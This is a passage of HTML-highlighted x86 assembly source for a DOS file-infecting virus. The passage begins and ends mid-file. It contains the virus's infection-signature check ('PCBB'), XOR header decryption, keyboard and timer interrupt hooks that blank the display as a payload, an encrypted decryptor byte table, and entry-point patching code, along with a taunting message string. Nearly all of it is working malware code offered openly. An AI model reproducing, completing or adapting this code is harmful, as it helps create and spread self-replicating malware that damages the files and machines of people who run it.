                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">;no time-change</span><span class="sc0">

</span><span class="sc1">;                pop     [di+4]</span><span class="sc0">
</span><span class="sc1">;                pop     [di+2]</span><span class="sc0">
</span><span class="sc1">;                push    [di+2]</span><span class="sc0">
</span><span class="sc1">;                push    [di+4]</span><span class="sc0">

</span><span class="sc5">close1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">                           </span><span class="sc1">;normal close</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">;no EOF on next close</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;restore attribute &amp; open-mode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;start NOP</span><span class="sc0">
</span><span class="sc1">;              lds     dx,cs:o13[0]</span><span class="sc0">
</span><span class="sc1">;              mov     ax,2513h</span><span class="sc0">
</span><span class="sc1">;              call    int21</span><span class="sc0">
</span><span class="sc1">;stop NOP</span><span class="sc0">


                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc5">read_info</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">;(ds)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_first_3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">failed</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">failed</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ofs_first_3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dummy</span><span class="sc0">

</span><span class="sc5">encr_l8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'IF'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'HS'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'W&amp;'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AH'</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EL'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encr_l8b</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">failed</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_scan_crc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">failed</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">failed</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_first_3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_chk_sig</span><span class="sc4">],</span><span class="sc12">'CP'</span><span class="sc0">     </span><span class="sc1">;is word [EOF-4] = 'PC' ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ofs_chk_sig</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'BB'</span><span class="sc0">   </span><span class="sc1">;is word [EOF-2] = 'BB' ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">failed</span><span class="sc0">

</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_call1</span><span class="sc0">
</span><span class="sc5">failed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_call1</span><span class="sc0">

</span><span class="sc1">;db 13,10</span><span class="sc0">
</span><span class="sc1">;db "Whoe to you of earth and sea...",13,10</span><span class="sc0">
</span><span class="sc1">;db "For the devil sends the beast with wrath,",13,10</span><span class="sc0">
</span><span class="sc1">;db "Because he knows the time is short...",13,10</span><span class="sc0">
</span><span class="sc1">;db "The people who have understanding,",13,10</span><span class="sc0">
</span><span class="sc1">;db "Reckon the number of the beast,",13,10</span><span class="sc0">
</span><span class="sc1">;db "Because it is a secret number...",13,10</span><span class="sc0">
</span><span class="sc1">;db "It's number is six-hundred and sixty-six!",13,10,36</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'When you are demoralized....   there is NO way out!'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc0">

</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€                       Keyboard (Int 09h) Handler                       €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">
</span><span class="sc5">key_rout</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_cntr</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_cntr</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cntr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">key_b1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">bb_stat</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">key_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">bb_stat</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">key_b2</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">417h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">key_b3</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">bb_stat</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3DAh</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3BAh</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">key_b3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">key_b2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">old_key</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;old KBD vector</span><span class="sc0">


</span><span class="sc1">;≥›€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€                      Timer Tick (Int 1Ch) Handler                      €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;≥›€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€ﬁ≥</span><span class="sc0">
</span><span class="sc5">tmr_rout</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">bb_stat</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tmr_b1</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3DAh</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3BAh</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;0 = off, 32 = on</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">tmr_b1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
                </span><span class="sc5">oldh</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;Old TIMER-TICK vector</span><span class="sc0">

</span><span class="sc5">enc_data</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">036h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">036h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Fh</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">

</span><span class="sc5">encr_h_ofs</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encr_h_cx</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encr_h_xor</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encr_h_len</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">repl0</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">repl1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">

</span><span class="sc5">patch_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">marker</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

